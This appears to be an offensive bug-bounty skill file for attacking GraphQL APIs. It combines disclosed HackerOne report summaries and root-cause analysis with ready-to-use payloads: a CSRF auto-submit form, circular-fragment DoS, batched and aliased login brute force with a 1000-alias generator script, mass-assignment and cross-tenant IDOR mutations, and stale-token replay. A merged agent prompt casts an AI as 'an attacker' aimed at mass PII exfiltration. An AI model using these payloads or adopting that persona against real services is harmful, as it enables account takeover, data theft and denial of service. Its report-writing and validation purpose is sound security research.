fragment F on User { friends { ...F } }
query { me { ...F } }
```

```json
[
  {"query":"{ user(id:1){ email } }"},
  {"query":"{ user(id:2){ email } }"},
  {"query":"{ user(id:3){ email } }"}
]
```

### CSRF via GET and transport quirks

```html
<!-- GitLab #1122408: GET bypasses the POST-only X-CSRF-Token requirement -->
<form action="https://gitlab.com/api/graphql/" method="GET">
  <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) { createSnippet(input: $input) { errors snippet { webUrl } } }">
</form>
<script>document.forms[0].submit()</script>
```

### Session / staleness probes

```bash
# After password change or session revoke, reuse the old token against /graphql
curl -s https://target.com/graphql -H "Authorization: Bearer OLD_TOKEN" \
  -d '{"query":"{ me { id sessions { edges { node { id ip_address } } } } }"}'
# #283847, #417382, #1192460, #608656: GraphQL answers when the UI refuses.
```

### Grep / recon helpers

```bash
grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
grep -rEo 'gid://[A-Za-z0-9_/]+/[0-9]+' .
grep -rE 'isAdmin|verified|role\s*[:=]|scope\s*[:=]' --include='*.js' --include='*.ts' .
```

### Variable-object pollution / mass assignment

```graphql
# Add fields the UI never sends; the server merges the whole input object.
mutation {
  updateInvitationPreferences(input:{
    receiveInvites: true,
    min_bounty: -1000,        # client slider enforced a minimum (#981036)
    time_off_ends_at: null
  }) { clientMutationId }
}

mutation {
  createAdminUser(input:{ email:"x@x", role:"ADMIN", password:"..." }) { token }
}
```

```json
{
  "operationName": "UpdateInvitationPreferencesMutation",
  "variables": { "min_bounty": 1337 },
  "query": "mutation UpdateInvitationPreferencesMutation($min_bounty: Float, ...) { updateInvitationPreferences(input: {min_bounty: $min_bounty, ...}) { ... } }"
}
```

### Cross-tenant GID mutation template

```graphql
mutation {
  createOrUpdateHackerCertification(input:{
    hackerId: "<victim_gid>", certifications: []
  }) { clientMutationId }
  # #2122671: an attacker could delete all of another user's certifications.
}

mutation {
  runnerUpdate(input:{ id:"<attacker_runner_gid>", associatedProjects:["<victim_project_gid>"] }) { ... }
  # GitLab-style project-scope missing: bind a malicious runner to a victim project.
}
```

### Detection signatures quick reference

| Response pattern | Interpretation | Example |
|---|---|---|
| `"data": { <sensitive field>: <value> }` to a low-priv user | Field-level authz broken | #489146, #417170 |
| `total_count` differs between two `order_by` fields | Sort-based oracle | #955286 |
| Value appears only as the 2nd `_or` condition | Secure-schema bypass | #645299 |
| `aggs.results.buckets` enumerates hidden values | Aggregation oracle | #1838329 |
| DNS/HTTP hit on Collaborator after `source=` | Confirmed blind SSRF | #1864188 |
| Response time scales linearly with alias count | Aliasing DoS | #3287208 |
| Cost bucket refills after a negative `first` | Cost-calc abuse | #481518 |
| `schema` dump from a `start` WebSocket frame | Transport control gap | #862835 |
| State change from a GET with no CSRF token | Method-bound CSRF defense | #1122408 |
| Object resolves after REST delete/revoke | Stale authorization | #1132606, #417382 |

### Source-code review grep patterns

```bash
# Resolvers that take an id/gid but may not re-scope it
grep -rE '(node\(id:|globalId|gid://|\.find\(params\[:id\]|\.find_by\(id:)' --include='*.rb' --include='*.py' --include='*.js' .

# Mutations without an authorization decorator/directive nearby
grep -rE 'mutation\s+\w+|@auth|authorize|ensure_|permission' --include='*.rb' --include='*.py' --include='*.ts' | head -200

# Arguments passed to outbound HTTP / SQL / search clients
grep -rE '(source|url|callbackUrl|sort_query|embedded_submission_form_uuid).*(get|fetch|requests\.|Net::HTTP|elasticsearch)' --include='*.rb' --include='*.py' --include='*.js' .

# Cost / depth / batch limit implementations (look for missing floor)
grep -rE '(queryCost|cost|maxDepth|batchSize|first:|last:)' --include='*.rb' --include='*.py' --include='*.ts' | head -100
```

---

## Common Root Causes

1. **Resolver-level authorization missing where middleware exists** — the dominant class in the pack. REST endpoints pass through a mature auth middleware; GraphQL resolvers are newer and skip it. #489146, #614355, #417170, #528940, #898528, #1091303.

2. **Trusting the relay GID without re-scoping** — the resolver decodes `gid://Owner/Type/id` and fetches object `id` without checking the requester owns it. #978143, #447930, #781150, #2207248, #800231.

3. **"Some tenant" instead of "this tenant" checks** — mutations authorize `is admin of some merchant` rather than `is admin of the merchant owning this object`. #1066203, #984965, #2122671.

4. **Dual-write without atomic locking** — REST and GraphQL modify the same resource independently; neither serializes or compares state, enabling races and covert privilege persistence. #2216036, #473742, #981036.

5. **Stale/cached authorization state** — a deleted attachment or revoked session remains readable because GraphQL serves a cached object or a token path the UI never uses. #1132606, #417382, #283847, #1192460, #608656.

6. **Secure-schema enforcement applied to only part of a query** — the first `_or`/`and` condition is rewritten to the secure filter, the second is not; or ordering/aggregation bypasses field-level redaction entirely. #645299, #955286, #1838329.

7. **Arguments passed straight to powerful backends** — a URL argument reaches an HTTP client (SSRF), a UUID reaches SQL, a sort string reaches Elasticsearch. No scheme/host allowlist or parameterization. #1864188, #435066, #3694007.

8. **Cost and batch limits computed on untrusted input** — negative `first` values reduce the cost bucket; unbounded aliases multiply a slow mutation; circular fragments recurse; playgrounds sit on production data. #481518, #3287208, #2048725, #1132803, #2886723.

9. **Transport-specific control gaps** — CSRF protection bound to POST only; introspection blocked on HTTP but not on WebSocket. #1122408, #862835.

10. **Undocumented/internal operations assumed unreachable** — `fileCopy`, `createAdminUser`-style mutations, and internal admin endpoints exposed through a proxy without an authz directive. #981472, #1350095, #3452015.

### Root-cause distribution across the 61 reports

| Root cause | Frequency signal in pack | Representative reports |
|---|---|---|
| Missing resolver-level authz / field-level authz | Dominant (`graphql` 61, `graphql-technique` 27) | #489146, #614355, #417170, #528940 |
| GID / object-reference trust | `idor-object-ref` 3 + many node cases | #978143, #447930, #781150, #2207248 |
| Cross-tenant scoping failure | `mutation-polyglot` 18 | #1066203, #984965, #2122671 |
| Dual-write / desync | `api-endpoint` 35 | #2216036, #473742, #981036 |
| Stale/cached authorization | `cache-layer` 6, `session-attack` 8 | #1132606, #417382, #1192460 |
| Query-language layer bypass | `search-filter-sort` 23, `filter-bypass` 10 | #645299, #955286, #1838329, #3694007 |
| Argument → powerful backend | `url-fetching` 9 | #1864188, #435066, #3694007 |
| Missing cost/limit controls | `dos-resource` 5 | #3287208, #481518, #2048725 |
| Transport control gap | `csrf` 4, `websocket` 1 | #1122408, #862835 |

**The through-line:** almost every finding is an *authorization mismatch* — two parts of the system (REST vs GraphQL, filter condition one vs condition two, UI vs resolver, owner vs tenant) disagree about what the caller is allowed to do. Hunt the disagreement, not the payload.

---

## Bypass Techniques

**Introspection disabled → enumerate anyway**
- Field-suggestion oracle: send a nonexistent field and parse `"Did you mean: [realField]?"`.
- Brute-force with `clairvoyance` or a wordlist of mutation names.
- Mine JS bundles for `operationName` and `query` strings.
- Alias the introspection field: `{ s: __schema { t: types { n: name } } }`.
- Try alternate transports: WebSocket `start` frames (#862835), GET `query=` (#1122408).
- Try the unauthenticated `__schema` prepend trick against private operations (#3452015).

**Authorization enforced on REST but not GraphQL**
- Replay the REST call and the GraphQL call with the same low-privilege token and diff the results (#614355).
- Reuse a disabled/deactivated/demoted session against GraphQL (#1192460, #608656).
- Test cross-tenant by swapping a single GID while keeping your own token (#2207248, #1066203).

**Secure-schema / filter bypass**
- Move the sensitive field to the second entry of `_or` or `and` (#645299).
- Use `order_by`/sort on a field you cannot read; `total_count` differences leak it (#955286).
- Use `aggs:{terms:{field:"..."}}` to enumerate values of a hidden field (#1838329).
- Pass raw script directives through `sort_query` when a keyword allowlist is absent (#3694007).

**Rate-limit / cost bypass**
- Negative `first` / `last` values to subtract from the cost bucket (#481518).
- Alias the same mutation N times in one request (#3287208).
- Batch operations as a JSON array to collapse N requests into one.
- If resolvers are single-threaded, combine aliases with parallel HTTP POSTs.

**CSRF / transport bypass**
- Convert a POST mutation to a GET with `query=` in the URL — no `X-CSRF-Token` required (#1122408).
- Use an auto-submitting HTML form to fire the GET cross-origin.
- Abuse a reverse proxy header such as `X-Shopify-Web-Force-Proxy: 1` to reach the internal GraphQL path.

**SSRF via GraphQL argument**
- Confirm blind SSRF with an OOB listener before claiming it; echoed errors or timing alone are not enough (#1864188).
- If responses are not returned, use DNS-encoded exfiltration and internal-port timing differentiation.

**Stale-object bypass**
- After a delete/revoke via REST or UI, re-query the object through GraphQL (#1132606, #417382).
- Replay a pre-change token against a resolver that never re-checks session validity (#283847).

**WAF blocking `__schema`**
- HTTP parameter pollution, alternate content-type headers, or GET instead of POST.
- Escalate to a non-playground endpoint that shares the same schema (#2048725's two Sorare instances).

### Token-scope and tenant-context bypass

```graphql
# A token minted for one scope may still authorize a broader GraphQL operation.
# GitHub #1711938: a scoped user-to-server token reached full Project V2 access.
query { node(id:"gid://github/ProjectV2/<victim>") { ... on ProjectV2 { fields { nodes { name } } } } }
```

```bash
# Swap tenant identifiers while keeping your own valid token.
curl -s https://target.com/graphql -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"query { billingDocumentDownload(id:\"gid://shopify/BillingInvoice/<other_tenant>\"){ url } }"}'
# #2207248, #984965: authorization checks "is a shop" / "is a tenant", not "is THIS shop".
```

### Edge / cache-layer bypass

- A CDN or cache may serve an object after the origin revoked it — re-query through GraphQL with a cache-busting header or a different field selection (#1132606).
- Add an unused alias to change the query shape and miss the cached denial response.
- If the proxy strips `X-CSRF-Token` on GET, confirm the origin accepts the mutation without it (#1122408).

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - A concrete action: read another tenant's PII, mutate an object they do not own, retain access after revocation, reach an internal service, or exhaust a resource. "Introspection is enabled" alone is not enough — it must unlock a specific, demonstrable finding.
   - For oracles, show at least two inputs with different outputs (private vs. non-private program: #715192, #770209, #347937).
   - For SSRF, show a confirmed DNS/HTTP callback tied to the argument (#1864188). For SQLi, show scaled time delays (#435066).

2. **What does the victim LOSE?**
   - Name the asset: PII of all users (#489146, #972355), cross-tenant data or payment details (#2207248), persistent admin access (#2216036), internal network reach, or availability (#3287208, #2048725).
   - Note that many single-field disclosures are legitimately low severity — quantify the actual blast radius rather than inflating it.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Provide the exact endpoint, operation name, variables, privilege tier, and GIDs.
   - Run it twice from a clean state. Desync/race steps must be deterministic; if a timing window is required, document it and test under low load.
   - Verify the endpoint is still live and the field still present before submission.

### Gate 0 quick-check table

| Question | Pass condition | Fail condition (do not report) |
|---|---|---|
| Concrete attacker action? | Cross-tenant read/write, revoked-access retention, OOB callback, or timed SQLi | "Introspection is enabled" with no downstream impact |
| Victim loss? | Named asset: PII, payment data, admin access, internal network, availability | A field that is public by program policy |
| 10-minute reproduction? | Exact operation + variables + privilege tier works twice | Requires timing luck or an unshareable token state |
| Control comparison? | Two accounts/tenants show different results | No second identity tested |
| OOB confirmation (if SSRF)? | DNS/HTTP hit tied to the argument | Echoed error or timing only |

---

## Real Impact Examples

**Scenario A — Cross-tenant invoice and PII exfiltration (Shopify-pattern, #2207248).**
A logged-in merchant captures a `BillingDocumentDownload` request and replaces the `BillingInvoice` GID with one belonging to another shop. Because the resolver authorizes "requester is a shop" but never "invoice belongs to requester's shop," the response returns the victim's full address, invoice contents, last four digits of their credit card, and shop identity. The same primitive turns one swapped base64 ID into systematic cross-merchant data theft.

**Scenario B — Covert persistent admin after REST revocation (GitHub-pattern, #2216036).**
An org admin removes a team's repository access through the REST API. The attacker, before or during the transfer/update, invokes `updateTeamsRepository` with the same repository GID. GraphQL re-asserts admin permission without validating current ownership state against the REST event. The UI reports the team removed; GraphQL state still grants write access, letting the attacker push code and read CI secrets while absent from the member list.

**Scenario C — Full-user PII enumeration from one query (HackerOne-pattern, #489146).**
The GraphQL endpoint lacked field-level access controls. A single `users { nodes { email account_recovery_phone_number facebook_user_id totp_enabled backup_codes_hash } }` query returned sensitive account-recovery and 2FA metadata for all users — a mass PII and account-takeover-enabling disclosure rated Critical (CVSS 9.3). The same class recurred as private emails via `user(username:)` (#972355) and payment counts via `team(handle:)` (#707433).

**Scenario D — GraphQL argument as an SSRF primitive (EXNESS-pattern, #1864188).**
The `allTicks` query accepted a `source` argument passed to a server-side GET client. Pointing it at a Collaborator domain produced incoming DNS and HTTP requests, confirming blind SSRF. Because responses were not returned, impact came from reaching internal services and port differentiation — a textbook case where the OOB gate is the difference between a valid and an N/A report.

**Scenario E — One-request DoS via negative cost and aliasing (Shopify/HackerOne-pattern, #481518, #3287208).**
Setting `appInstallations(first: -1000)` produced a negative query-cost contribution that refilled the app's rate-limit bucket, allowing unbounded queries. Separately, aliasing the slow `verifyAccountRecoveryPhoneNumber` mutation N times in a single request added roughly eight seconds per alias, exhausting server resources. Both are single-actor availability attacks on shared infrastructure.

**Scenario F — Private-program existence oracle from a single scalar (HackerOne-pattern, #715192, #770209, #347937).**
Querying `vpn_suspended`, `report_sources`, or `i_cannot_create_jira_webhook_reasons` on arbitrary `Team` handles returned different values depending on whether the program had a private program. No private data was returned directly, but the differential disclosed confidential business relationships across the entire platform — a repeatable oracle worth $500–$2,500 per field. The lesson: small scalar differences compound into strategic intelligence.

**Scenario G — Search argument as a script-execution primitive (HackerOne-pattern, #3694007).**
The `sort_query: String` argument on `Query.search` was forwarded to the downstream Elasticsearch cluster as the raw `sort` value. Submitting two requests that differed only in `script.source` — one returning a constant, one reading each document's `_seq_no` — produced different orderings with zero overlap in the top five results, confirming per-document Painless script execution. A GraphQL string argument became code execution inside the search tier.

---

## Disclosed Report Citations (30 — all IDs verified in the study pack or TOPGRAPHQL.md)

1. **HackerOne — Confidential data of users and limited metadata of programs and reports accessible via GraphQL** ([H1 #489146](https://hackerone.com/reports/489146)) — broken field-level authorization, mass PII exposure via `users { nodes { ... } }`, 2019, $0 (Critical, CVSS 9.3).
2. **HackerOne — Email address of any user can be queried on Report Invitation GraphQL type when username is known** ([H1 #792927](https://hackerone.com/reports/792927)) — mutation PII disclosure via a base64 report GID in `addReportParticipant`, 2020, $0.
3. **HackerOne — IDOR: Delete all Licenses and certifications via CreateOrUpdateHackerCertification** ([H1 #2122671](https://hackerone.com/reports/2122671)) — mutation IDOR, unauthorized destructive write, year n/s, $12,500.
4. **X / xAI — Private list members disclosure via GraphQL** ([H1 #885539](https://hackerone.com/reports/885539)) — IDOR via snowflake brute-force on `ListMembers`, 2020, $0.
5. **EXNESS — SSRF in graphQL query (pwapi.ex2b.com)** ([H1 #1864188](https://hackerone.com/reports/1864188)) — SSRF via the `source` argument of `allTicks`, OOB-confirmed, 2023, $3,000.
6. **GitHub — GitHub Apps can use Scoped-User-To-Server Tokens to Obtain Full Access to User's Projects in Project V2 GraphQL api** ([H1 #1711938](https://hackerone.com/reports/1711938)) — token-scope confusion, authorization bypass, year n/s, $0.
7. **Shopify — IDOR on GraphQL queries BillingDocumentDownload and BillDetails** ([H1 #2207248](https://hackerone.com/reports/2207248)) — cross-tenant GID IDOR, PII and card-data leak, 2024, $5,000.
8. **HackerOne — Disclosure of `payment_transactions` for programs via GraphQL query** ([H1 #707433](https://hackerone.com/reports/707433)) — single sensitive field exposed on `Team`, 2019, $0.
9. **HackerOne — SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter** ([H1 #435066](https://hackerone.com/reports/435066)) — SQLi via a query-string argument, `pg_sleep` time-based confirmation, 2018, $0 (CVSS 10.0).
10. **Shopify — GraphQL AdminGenerateSessionPayload is leaked to staff with no permission** ([H1 #898528](https://hackerone.com/reports/898528)) — field-level authorization failure, year n/s, $0.
11. **HackerOne — DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API** ([H1 #3287208](https://hackerone.com/reports/3287208)) — DoS via aliased slow mutation, ~8s per alias, 2024, $12,500.
12. **Shopify — Undocumented `fileCopy` GraphQL API** ([H1 #981472](https://hackerone.com/reports/981472)) — undocumented mutation enabling cross-store file copy by a no-permission staff account, 2020, $2,000.
13. **HackerOne — Team object in GraphQL disclosed private_comment** ([H1 #978143](https://hackerone.com/reports/978143)) — `node(id:)` IDOR exposing private survey comments, 2020, $2,500.
14. **Starbucks — Bug in GraphQL and API integration leads to limited user address disclosure** ([H1 #473742](https://hackerone.com/reports/473742)) — REST/GraphQL integration desync, `undefined` parameter, 2019, $0.
15. **HackerOne — Unauthorized user can obtain `report_sources` attribute through Team GraphQL object** ([H1 #770209](https://hackerone.com/reports/770209)) — single-field private-program oracle, 2020, $2,500.
16. **HackerOne — Private information exposed through GraphQL filters** ([H1 #645299](https://hackerone.com/reports/645299)) — secure-schema bypass via the second `_or` condition, 2019, $0.
17. **TikTok — Cross-Tenant IDOR via `AddRulesToPixelEvents` query** ([H1 #984965](https://hackerone.com/reports/984965)) — cross-tenant IDOR with add/update/delete impact, year n/s, $0.
18. **GitLab — CSRF on /api/graphql allows executing mutations through GET requests** ([H1 #1122408](https://hackerone.com/reports/1122408)) — CSRF via POST→GET, no `X-CSRF-Token`, 2021, $3,370.
19. **HackerOne — Embedded submission form UUIDs can be enumerated through GraphQL node interface** ([H1 #447930](https://hackerone.com/reports/447930)) — `node(id:)` IDOR via base64 PK iteration, 2018, $0.
20. **GitLab — A deactivated user can access data through GraphQL** ([H1 #1192460](https://hackerone.com/reports/1192460)) — authorization state not enforced across API transports, 2021, $1,370.
21. **Shopify — Bypass GraphQL rate limit by abusing negative cost queries** ([H1 #481518](https://hackerone.com/reports/481518)) — query-cost calculator abuse with `first: -1000`, 2019, $0.
22. **Nuri — GraphQL introspection query works through unauthenticated WebSocket** ([H1 #862835](https://hackerone.com/reports/862835)) — introspection via `start` frame, transport control gap, 2020, $0.
23. **Shopify — Low-privilege user can read POS PINs via graphql and elevate privilege** ([H1 #1091303](https://hackerone.com/reports/1091303)) — field-level authorization failure on POS PINs, 2021, $0.
24. **HackerOne — GraphQL node interface for ActiveResource models lacks encoding for resource identifier** ([H1 #800231](https://hackerone.com/reports/800231)) — parameter injection into a backend HTTP request via a GID, 2020, $0.
25. **HackerOne — Private information exposed through GraphQL search endpoints aggregates** ([H1 #1838329](https://hackerone.com/reports/1838329)) — private-data oracle via `aggs`/`terms`, 2021, $0.
26. **Enjin — Unauthenticated GraphQL access by prepending __schema to private operations** ([H1 #3452015](https://hackerone.com/reports/3452015)) — authentication bypass, year n/s, $0.
27. **Stripe — GRAPHQL cross-tenant IDOR giving write access through UpdateAtlasApplicationPerson** ([H1 #1066203](https://hackerone.com/reports/1066203)) — cross-tenant mutation IDOR, 2020, $0.
28. **GitHub — RC between Repo Transfer REST API and updateTeamsRepository GraphQL Mutation** ([H1 #2216036](https://hackerone.com/reports/2216036)) — REST/GraphQL state desync, covert persistent admin, year n/s, $0.
29. **HackerOne — Authenticated Elasticsearch Painless script execution via Query.search.sort_query** ([H1 #3694007](https://hackerone.com/reports/3694007)) — raw search argument reaches the search cluster as a scripted sort, year n/s, bounty n/s.
30. **Shopify — Stored XSS in product description via `productUpdate` GraphQL query** ([H1 #1085546](https://hackerone.com/reports/1085546)) — stored XSS through a mutation field, year n/s, $1,600.

---

## Related Skills & Chains

- **`hunt-idor`** — `node(id:)` and relay-GID resolvers are IDOR factories: same shape, no scoping. Chain primitive: introspection + GID decode/replay (#447930, #978143, #2207248) → cross-tenant read or write.
- **`hunt-api-misconfig`** — GraphQL mutations are mass-assignment magnets; clients send whole `input` objects. Chain primitive: mutation + extra fields (`isAdmin:true`, `verified:true`) → privilege escalation.
- **`hunt-race-condition`** — GraphQL batching/aliasing collapses N mutations into one request. Chain primitive: alias + desync → covert privilege persistence (#2216036), combined with parallel-HTTP for single-threaded resolvers.
- **`hunt-ssrf`** — GraphQL URL arguments are SSRF entry points. Chain primitive: `source`/`url` argument + OOB confirmation → internal service access; apply the OOB-Or-It-Didn't-Happen gate before claiming #1864188-style findings.
- **`hunt-sqli`** — GraphQL arguments funnel into SQL. Chain primitive: embedded UUID/String arg + stacked queries → time-based confirmation (#435066).
- **`hunt-business-logic`** — cost/aggregation/filter arguments encode business rules. Chain primitive: negative `first` (#481518) or `_or` second condition (#645299) → rate-limit bypass or redaction bypass.
- **`hunt-auth-bypass`** — deactivated/disabled/no-permission contexts are under-tested in resolvers. Chain primitive: lower-privilege or stale session + GraphQL-only path → data access (#1192460, #417170, #3452015).
- **`security-arsenal`** — load the GraphQL Payload Pack: full introspection query, suggestion-error oracle, alias-amplification template, negative-cost query, circular-fragment DoS, GID decoder.
- **`triage-validation`** — apply the Body-Diff Rule: introspection alone is informational; require a concrete cross-tenant read, mutation-with-impact, or OOB-confirmed PoC before submitting.


---

## Merged Source Knowledge

This section consolidates **106 unique knowledge blocks** from 5 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (113 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/bountyforge/references/hacking-agents/graphql-agent.md`

# GraphQL Agent

You are an attacker that exploits GraphQL APIs: missing field-level auth, introspection leaks, batching attacks, alias-based brute force, and mass data exfiltration.

Other agents cover web injection, auth, and access control. You own: GraphQL schema analysis, missing auth detection, query abuse, and PII extraction via GraphQL.

### Introspection & Schema Discovery

**Full introspection query:**
```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
      }
    }
  }
}
```

**Find sensitive types:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Look for: User, Report, Program, Email, Token, Secret, PII, Password
```

**Check for disabled introspection:**
```graphql

### Missing Field-Level Auth (H100 Proven — 3 reports)

This pattern appeared 3 times in the top 100 reports, enabling mass PII exfil.

**Attack flow:**
```
1. Run introspection → find user-related types
2. Query fields without authentication
3. If sensitive fields (email, PII) returned → missing auth
4. Enumerate all users via pagination or node() queries
5. Extract full user database
```

**Exploit user email disclosure:**
```graphql

# Query user emails without auth
{
  users(first: 100) {
    edges {
      node {
        id
        email
        name
      }
    }
  }
}

# Or via node() query
{
  node(id: "base64(UserType:1)") {
    ... on User {
      email
      name
    }
  }
}
```

**Test field-level auth on mutations:**
```graphql

# Can you mutate without auth?
mutation {
  updateUserProfile(input: { email: "attacker@evil.com" }) {
    user {
      id
      email
    }
  }
}
```

### Batching Attack — Rate Limit Bypass

GraphQL batching sends multiple queries in one request, bypassing rate limits.

**Login brute force:**
```json
[
  {"query": "mutation { login(email:\"user@test.com\",password:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"user@test.com\",password:\"pass2\") { token } }"},
  {"query": "mutation { login(email:\"user@test.com\",password:\"pass3\") { token } }"},
  {"query": "mutation { login(email:\"user@test.com\",password:\"pass4\") { token } }"},
  {"query": "mutation { login(email:\"user@test.com\",password:\"pass5\") { token } }"}
]
```

**Mass data extraction:**
```json
[
  {"query": "{ users(first:100) { edges { node { id email } } } }"},
  {"query": "{ programs(first:100) { edges { node { id name } } } }"},
  {"query": "{ reports(first:100) { edges { node { id title } } } }"}
]
```

### Alias-Based Brute Force

Aliases let you send the same query multiple times in one request:

```graphql
query {
  a1: login(email: "user@test.com", password: "pass1") { token }
  a2: login(email: "user@test.com", password: "pass2") { token }
  a3: login(email: "user@test.com", password: "pass3") { token }
  a4: login(email: "user@test.com", password: "pass4") { token }
  a5: login(email: "user@test.com", password: "pass5") { token }
  a6: login(email: "user@test.com", password: "pass6") { token }
  a7: login(email: "user@test.com", password: "pass7") { token }
  a8: login(email: "user@test.com", password: "pass8") { token }
  a9: login(email: "user@test.com", password: "pass9") { token }
  a10: login(email: "user@test.com", password: "pass10") { token }
}
```

**Automate with large alias count:**
```python
import json

query = "query {\n"
for i in range(1, 1001):
    query += f'  a{i}: login(email:"user@test.com", password:"pass{i}") {{ token }}\n'
query += "}"

payload = json.dumps({"query": query})
```

# Try other IDs
{
  node(id: "VXNlcjo0NTY=") {  # User:456
    ... on User {
      email
      name
    }
  }
}
```

**Enum-based IDOR:**
```graphql

# Chain mutations for privilege escalation
mutation {
  createOrganization(input: { name: "Evil Org" }) {
    organization {
      id
      inviteUser(email: "attacker@evil.com", role: ADMIN) {
        user { id }
      }
    }
  }
}
```

# Find deprecated fields (may still work)
{
  __type(name: "User") {
    fields(includeDeprecated: true) {
      name
      isDeprecated
      deprecationReason
    }
  }
}
```

### Testing Checklist

- [ ] Run full introspection — find all types and fields
- [ ] Query sensitive fields without auth — test each type
- [ ] Test batch queries (array of queries in one request)
- [ ] Test alias-based brute force (1000 aliases in one query)
- [ ] Decode node IDs — try sequential IDs
- [ ] Check for subscriptions — they may bypass rate limits
- [ ] Test mutation auth — can you mutate without tokens?
- [ ] Look for deprecated fields — may still be accessible
- [ ] Check query depth limits — can you nest deeply?
- [ ] Test with different auth levels (no auth, user, admin)

## Output Fields

Add to FINDINGs:

```
introspection_enabled: true | false
sensitive_types: <list of types with PII fields>
missing_auth_fields: <fields queryable without auth>
batch_abuse_possible: true | false
alias_count_tested: <number of aliases used>
node_id_format: <base64 type:ID | sequential | uuid>
data_exfiltrated: <types and fields extracted>
rate_limit_bypassed: true | false
```

## Rules
- GraphQL introspection alone is informational — must chain to data exfil or auth bypass for paid bounty
- Batching can bypass rate limits on login, password reset, and API calls
- Node IDs are often base64-encoded — decode them to find raw IDs
- Deprecated fields may still work — always test with includeDeprecated: true
- Subscriptions can be real-time data leaks — check if they require auth
- Test with no auth, low-priv auth, and admin auth — different levels may have different access


### From `hunt-skills/graphql-audit/SKILL.md`

# GRAPHQL SECURITY AUDIT

> GraphQL flips the threat model — clients drive queries. One endpoint, infinite attack surface. Introspection hands you the schema; even without it, field suggestions give you 80% back.

---

## 0. QUICK KILL CHECKLIST

```
[ ] Run graphql_audit.sh <endpoint> — full automated sweep
[ ] Check if introspection is enabled (__schema query)
[ ] If introspection off — run clairvoyance for field discovery
[ ] Fingerprint engine (graphw00f) — different engines, different CVEs
[ ] Test query batching — send 100 identical queries in one POST
[ ] Test alias bombing — 1000 aliases in one query
[ ] Check field suggestions on typos — leaks schema even when introspection off
[ ] Try IDOR: query another user's object by ID, no auth check
[ ] Test field-level auth: query privileged fields (admin, role, internalNote)
[ ] Inject SQLi/NoSQLi via string arguments — id, filter, search args
[ ] Check subscriptions: can you subscribe to other users' events?
[ ] Try introspection bypass: __schema\nquery, query batching, fragment tricks
[ ] Look for mutation rate limiting — account takeover / self-XSS via mutations
```

---

# With auth cookie
bash tools/graphql_audit.sh https://target.com/api/graphql --cookie "session=abc123"

# With Authorization header
bash tools/graphql_audit.sh https://target.com/graphql --header "Authorization: Bearer TOKEN"

# Through Burp proxy
bash tools/graphql_audit.sh https://target.com/graphql --proxy http://127.0.0.1:8080

# Custom output directory
bash tools/graphql_audit.sh https://target.com/graphql --output-dir ./findings/target/graphql
```

**Output:** `findings/<target>/graphql/<timestamp>/`
- `introspection.json` — full schema dump (if enabled)
- `fingerprint.txt` — engine type (graphw00f)
- `field_suggestions.txt` — discovered fields via clairvoyance
- `batching_dos.txt` — response time delta for 1 vs 100 queries
- `alias_bomb.txt` — alias depth test results
- `gqlmap.txt` — injection scan results
- `cop_report.txt` — graphql-cop attack checklist results
- `summary.txt` — hit/miss per phase

---

# Pull complete introspection schema (pipe to InQL or graphql-voyager)
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
  }' | jq . > schema.json
```

### What To Look For In The Schema

```
- Mutations involving user data: updateUser, deleteAccount, changeEmail, changePassword
- Queries returning other users' objects: user(id: X), order(id: X)
- Fields: internalNote, adminOnly, role, isAdmin, rawPassword, apiKey
- Types: AdminUser, InternalConfig, DebugInfo
- Deprecated fields — often bypassed auth or forgotten
- Subscription types — real-time data leaks
```

# __type instead of __schema (often overlooked in blocklists)
{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}

# Via GET request (some servers allow GET, filter only POST)
GET /graphql?query={__schema{queryType{name}}}

## 3. FIELD SUGGESTION ABUSE (Introspection Off — Still Works)

GraphQL engines return helpful "Did you mean X?" errors on typos. This leaks field names.

# Typo on a known field to trigger suggestions
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ usr { id } }"}' | grep -i "suggest\|did you mean\|Cannot query"
```

# Run field discovery against a known type
clairvoyance -u https://target.com/graphql -o schema.json

# Seed with known type names (speeds up discovery significantly)
clairvoyance -u https://target.com/graphql \
  --input-document schema_partial.json \
  -o schema_full.json
```

**What clairvoyance recovers:** type names, field names, argument names — ~80% of introspection output even when blocked.

---

## 4. BATCHING DoS (High Payout, Easy to Prove)

GraphQL allows sending multiple operations in one POST. No rate limit = DoS or brute-force amplifier.

# 100 queries in one request — measure response time delta
python3 -c "
import json, sys
q = {'query': '{ __typename }'}
print(json.dumps([q] * 100))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'
```

# 500 aliases — each alias is a separate resolver call
python3 -c "
aliases = ' '.join(f'q{i}: __typename' for i in range(500))
print('{\"query\": \"{ ' + aliases + ' }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

### Impact Escalation

- **Brute force amplifier:** 100 login mutations per HTTP request → bypasses per-IP lockout
